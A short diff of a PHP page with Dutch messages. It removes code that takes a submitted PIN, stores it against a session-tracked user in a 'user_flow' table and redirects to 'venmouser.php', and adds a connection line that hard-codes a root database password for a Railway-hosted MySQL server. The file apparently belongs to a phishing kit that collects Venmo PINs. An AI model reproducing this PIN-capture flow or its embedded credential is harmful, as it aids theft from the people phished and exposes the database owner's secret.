@@ -1,31 +1,10 @@
 <?php
-session_start();
+$conn = new mysqli('mysql.railway.internal', 'root', 'dKoENyxanuhrHlOuWovDKCbOMcJQKtFM', 'railway', 3306);
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $conn = new mysqli('localhost', 'root', '', 'my_base');
-    if ($conn->connect_error) {
-        die("Connectie mislukt: " . $conn->connect_error);
-    }
-
-    $pin = $_POST['pin'] ?? '';
-    $user_id = $_SESSION['user_flow_id'] ?? null;
-
-    if (!empty($pin) && $user_id) {
-        $stmt = $conn->prepare("UPDATE user_flow SET pin = ? WHERE id = ?");
-        $stmt->bind_param("si", $pin, $user_id);
-        $stmt->execute();
-
-        $stmt->close();
-        $conn->close();
-
-        header("Location: venmouser.php");
-        exit();
-    } else {
-        echo "PIN of sessie-ID ontbreekt.";
-    }
+if ($conn->connect_error) {
+    die("Connectie mislukt: " . $conn->connect_error);
 }
 ?>
-
 
 <!DOCTYPE html>
 <html lang="en">
